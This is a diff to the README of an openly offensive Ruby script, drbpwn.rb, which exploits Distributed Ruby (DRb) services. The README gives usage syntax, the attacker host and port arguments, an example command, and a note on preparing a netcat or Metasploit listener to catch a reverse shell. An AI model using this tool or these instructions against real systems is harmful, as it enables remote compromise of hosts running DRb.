@@ -6,13 +6,15 @@ This Ruby script provides a workaround for exploiting Distributed Ruby (DRb) vul
 ## Usage
 To use the script, follow the syntax below:
 
-```ruby drbpwn.rb <target_host> <target_port> [<attacker_host>] [<attacker_port>]```
+```ruby drbpwn.rb <target_host> <target_port> <attacker_host> [<attacker_port>]```
 
 ### Arguments
 - `<target_host>`: The hostname or IP address of the target machine.
 - `<target_port>`: The port number on which the DRb service is running on the target machine.
 - `<attacker_host>`: The hostname or IP address of the attacker machine.
-- `[<attacker_port>]`: (Optional) The port number to be used for the attacker's payload. Defaults to `4444` if not provided.
+- `[<attacker_port>]`: (Optional) The port number on which attacker is listening. Defaults to `4444` if not provided.
+
+- Note: Before running this script, make sure the attacker machine is listening for incoming connections on the designated port using netcat (nc) or Metasploit's multi/handler.
 
 ## Example
 ```ruby drbpwn.rb 192.168.0.100 8787 192.168.0.107```
